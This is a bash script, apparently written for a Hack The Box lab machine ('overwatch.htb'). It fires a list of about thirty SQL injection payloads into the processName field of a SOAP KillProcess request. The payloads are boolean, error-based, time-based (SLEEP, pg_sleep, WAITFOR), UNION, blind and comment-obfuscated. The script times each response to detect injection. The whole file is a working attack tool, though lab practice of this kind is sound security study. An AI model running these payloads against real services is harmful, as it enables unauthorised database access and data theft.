#!/bin/bash
TARGET="http://overwatch.htb:8000/MonitorService"

echo "=== Testing SQL Injection ==="

SQL_TESTS=(
  # Basic SQL injections
  "' OR '1'='1"
  "\" OR \"1\"=\"1"
  "' OR 'a'='a"
  "' OR 1=1 --"
  "' OR 1=1#"
  "' OR 1=1/*"
  
  # Error based
  "'"
  "\""
  "';"
  "\";"
  "';--"
  "\";--"
  
  # Time-based (different DBs)
  "' OR SLEEP(5)--"
  "' OR pg_sleep(5)--"
  "' OR WAITFOR DELAY '00:00:05'--"
  "' OR BENCHMARK(10000000,MD5(1))--"
  
  # UNION tests
  "' UNION SELECT NULL--"
  "' UNION SELECT NULL,NULL--"
  "' UNION SELECT NULL,NULL,NULL--"
  
  # Database specific
  "' OR '1'='1' LIMIT 1--"          # MySQL/PostgreSQL
  "') OR ('1'='1"                   # Parentheses
  "' OR '1'='1' ORDER BY 1--"       # Column count
  
  # Blind SQL
  "' AND '1'='1"
  "' AND '1'='2"
  "' AND SUBSTRING(@@version,1,1)='5'--"
  
  # Comments variations
  "'/**/OR/**/'1'='1"
  "'%0AOR%0A'1'='1"
  "'%09OR%09'1'='1"
)

for i in "${!SQL_TESTS[@]}"; do
  sql="${SQL_TESTS[$i]}"
  echo -n "Test [$((i+1))/${#SQL_TESTS[@]}]: '$sql' ... "
  
  xml_data=$(cat <<EOF
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>$sql</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
EOF
  )
  
  START=$(date +%s.%N)
  RESPONSE=$(curl -X POST "$TARGET" \
    -H "Content-Type: text/xml" \
    -H "SOAPAction: \"http://tempuri.org/IMonitoringService/KillProcess\"" \
    --data "$xml_data" \
    -s 2>/dev/null)
  END=$(date +%s.%N)
  
  TIME=$(echo "$END - $START" | bc | awk '{printf "%.2f", $0}')
  
  # Check response type
  if echo "$RESPONSE" | grep -q "KillProcessResult"; then
    RESULT=$(echo "$RESPONSE" | grep -oP '(?<=<KillProcessResult>)[^<]+')
    echo "SUCCESS ($TIME s): $RESULT"
  elif echo "$RESPONSE" | grep -q "System.Management.Automation"; then
    echo "POWERSHELL ERROR ($TIME s)"
  elif echo "$RESPONSE" | grep -q "faultstring"; then
    ERROR=$(echo "$RESPONSE" | grep -oP '(?<=<faultstring[^>]*>)[^<]+' | head -1)
    echo "ERROR ($TIME s): $ERROR"
  else
    echo "UNKNOWN ($TIME s)"
    # Show first line of unexpected response
    echo "$RESPONSE" | head -1
  fi
  
  # Check for time-based evidence
  if (( $(echo "$TIME > 4.0" | bc -l) )); then
    echo "  ⚠️  POSSIBLE TIME-BASED INJECTION DETECTED!"
  fi
  
  # Small delay to avoid flooding
  sleep 0.5
done

echo "=== SQL Injection Test Complete ==="
